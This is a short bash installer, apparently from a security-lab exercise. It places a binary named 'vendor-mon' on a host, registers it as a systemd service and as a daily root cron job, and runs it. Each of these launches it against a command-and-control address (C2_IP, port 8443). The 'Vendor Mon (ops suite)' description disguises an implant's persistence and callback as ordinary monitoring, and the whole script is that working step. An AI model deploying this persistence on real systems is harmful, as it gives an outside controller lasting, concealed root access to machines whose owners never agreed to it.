#!/usr/bin/env bash
# ops（窗口内）：套件安装——二进制+systemd 单元+cron 报告（与清单逐项一致）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
install -m 0755 vendor-mon /usr/local/bin/vendor-mon
printf '[Unit]\nDescription=Vendor Mon (ops suite)\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/vendor-mon %s 8443\n[Install]\nWantedBy=multi-user.target\n' "$C2_IP" > /etc/systemd/system/vendor-mon.service
systemctl daemon-reload
systemctl enable vendor-mon.service >/dev/null 2>&1 || true
echo "5 4 * * * root /usr/local/bin/vendor-mon $C2_IP 8443" > /etc/cron.d/vendor-mon-report
/usr/local/bin/vendor-mon "$C2_IP" 8443
